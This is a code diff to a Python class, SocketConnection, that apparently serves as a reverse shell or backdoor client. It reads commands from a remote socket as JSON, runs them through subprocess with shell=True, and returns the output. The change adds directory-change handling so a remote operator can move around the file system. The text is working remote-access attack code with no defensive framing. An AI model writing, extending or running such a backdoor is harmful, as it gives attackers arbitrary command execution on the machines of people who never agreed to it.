@@ -1,7 +1,7 @@
 import socket
-#from socket import SOCK_STREAM, socket, AF_INET
 import subprocess
 import json
+import os
 
 class SocketConnection:
     def __init__(self,ip,port):
@@ -28,13 +28,21 @@ class SocketConnection:
     def command_execution(self,command):
         return subprocess.check_output(command, shell=True)
 
+    # Cd Command Implementation
+    def cd_command(self,directory):
+        os.chdir(directory)
+        return "cd \\" + directory
+
     def start_socket(self):
         while True: # Create infinite loop of execution of commands
             command = self.json_receive()
             if command[0] == "exit":
                self.connection.close()
                exit()
-            command_output = self.command_execution(command).decode()
+            elif command[0] == "cd" and len(command) > 1:
+                command_output = self.cd_command(command[1])
+            else: 
+                command_output = self.command_execution(command).decode()
             self.json_send(command_output)
         self.connection.close()
 
